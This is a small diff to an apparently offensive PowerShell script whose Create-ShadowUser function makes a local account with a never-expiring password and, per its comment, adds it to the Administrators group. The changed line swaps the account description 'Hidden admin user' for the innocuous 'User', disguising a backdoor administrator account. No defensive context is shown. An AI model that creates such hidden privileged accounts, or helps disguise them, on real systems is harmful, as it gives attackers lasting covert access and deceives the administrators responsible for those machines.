@@ -84,7 +84,7 @@ function Create-ShadowUser {
         try {
             Write-Host "[*] Creating user '$username'..."
             $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-            New-LocalUser -Name $username -Password $securePass -FullName "Shadow User" -Description "Hidden admin user" -PasswordNeverExpires -AccountNeverExpires
+            New-LocalUser -Name $username -Password $securePass -FullName "Shadow User" -Description "User" -PasswordNeverExpires -AccountNeverExpires
             Write-Host "[+] User '$username' created."
 
             # Add user to Administrators group
